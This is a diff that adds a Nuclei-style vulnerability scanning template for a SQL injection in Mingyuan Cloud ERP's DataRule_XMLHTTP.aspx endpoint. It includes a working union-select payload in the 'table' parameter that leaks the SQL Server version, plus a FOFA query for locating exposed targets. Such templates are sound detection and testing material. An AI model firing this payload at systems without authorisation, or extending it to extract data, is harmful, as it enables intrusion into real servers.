@@ -1,0 +1,27 @@
+id: mingyuanyun-erp-datarule-xmlhttp-sqli
+
+info:
+  name: 明源云 ERP DataRule_XMLHTTP SQL 注入
+  author: avic123
+  severity: high
+  description: |
+    明源云 ERP /BUAdjust/DataRule/DataRule_XMLHTTP.aspx 的 table 参数可联合查询 @@version，回显 Microsoft SQL Server 版本。
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="明源云" && body="ERP"
+  tags: mingyuan,erp,sqli
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/BUAdjust/DataRule/DataRule_XMLHTTP.aspx/?ywtype=getFieldXML&table=-1%27%20union%20select%20@@version--"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Microsoft SQL Server"
+      - type: status
+        status:
+          - 200
